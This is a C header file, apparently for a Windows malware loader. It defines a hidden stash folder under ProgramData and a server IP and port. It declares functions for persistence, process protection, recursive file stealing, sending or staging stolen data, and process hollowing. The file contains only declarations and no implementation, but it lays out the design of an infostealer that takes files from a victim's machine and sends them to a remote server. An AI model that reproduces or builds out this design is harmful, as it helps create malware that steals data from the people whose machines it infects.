#ifndef LOADER_H
#define LOADER_H

#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define STASH_DIR "C:\\ProgramData\\SpectreCache"
#define SERVER_IP "192.168.0.102" // Apna IP check kar lena
#define SERVER_PORT 9001

// Functions
void SetPersistence();
void ProtectProcess();
void StashOrSend(const char* filename, const char* content, long size);
void SyncOfflineData();
void RecursiveSteal(const char* basePath);
void MockHollow(const char* target);

#endif